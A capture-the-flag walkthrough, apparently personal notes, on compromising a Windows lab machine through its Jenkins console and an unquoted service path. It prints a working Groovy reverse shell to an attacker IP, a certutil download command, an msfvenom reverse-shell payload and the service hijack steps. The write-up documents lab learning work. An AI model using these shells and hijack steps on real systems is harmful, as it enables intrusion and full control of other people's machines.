## Enumerating port 8080

- Discover Jenkins login page
- Bruteforce credentials and discover `jenkins:jenkins` (cheated tho)
- Research jenkins exploits 

## Exploiting Jenkins
- Research jenkins vulnerabilities and find that the best way to gain a shell is through the groovy script feature under the manage section.
- Exploit blog: https://blog.pentesteracademy.com/abusing-jenkins-groovy-script-console-to-get-shell-98b951fa64a6
-
```groovy
String host="192.168.17.5";
int port=1234
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

## Enumerating the windows machine for potential priv-esc
- Dig around machine and discover downloaded file:

![[Pasted image 20210918235731.png]]

>Always check the time that the file was last modified to gain more clues or insight on CTF style machines


- Use winpeas
- Download it onto machine using the following command:
- certutil.exe -urlcache -f http://192.168.17.5:80/winpeas.exe winpeas.exe
![[Pasted image 20210918234306.png]]
- Run winpeas and discover that there is no quotes and space (Unquoted service paths) detected with the ability to modify this service:
![[Pasted image 20210918234629.png]]
- Basically, the service executible is located in a path that is not enclosed in quotes and there is a space detected. The issue is that when windows runs this it looks for every instance that exists before the space and tries to add ".exe" (taken from video explanation).
- We can hijack this process to become root.

## Becoming root
- Generate reverse tcp shell with msfvenom:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.17.5 LPORT=4444 -f exe -o bad.exe
```

- Download file onto machine in the correct directory:

![[Pasted image 20210918235352.png]]

- Check services running on machine `sc query`
- Stop Wise `sc stop WiseBootAsistant`
- Query Wise `sc query WiseBootAssistant`
- Start your netcat listener on attacker machine `nc -lvnp 4444`
- Restart Wise `sc start WiseBootAssistant`
- We are root
